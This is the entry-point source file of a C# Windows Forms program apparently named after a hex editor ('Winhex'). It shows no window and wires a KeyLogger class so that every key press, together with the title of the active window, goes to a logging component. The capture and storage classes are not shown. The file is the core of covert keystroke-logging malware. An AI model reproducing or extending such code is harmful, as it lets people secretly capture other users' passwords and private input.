using System;
using System.Collections.Generic;
using System.Linq;
using System.Windows.Forms;
using Winhex.Interfaces;
using Winhex.Models;

namespace Winhex
{
    static class Program
    {
        private static ILogCreator loger;
        static Program()
        {
            Resolver.RegisterDependencyResolver();
        }
        /// <summary>
        /// Главная точка входа для приложения.
        /// </summary>
        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            KeyLogger k = new KeyLogger();
            k.OnKeyPressed += K_OnKeyPressed;
            loger = new UserLogCreator();
            Application.Run();
        }

        private static void K_OnKeyPressed(string title, char sym)
        {
            loger.AddKey(title, sym);
        }
    }
}
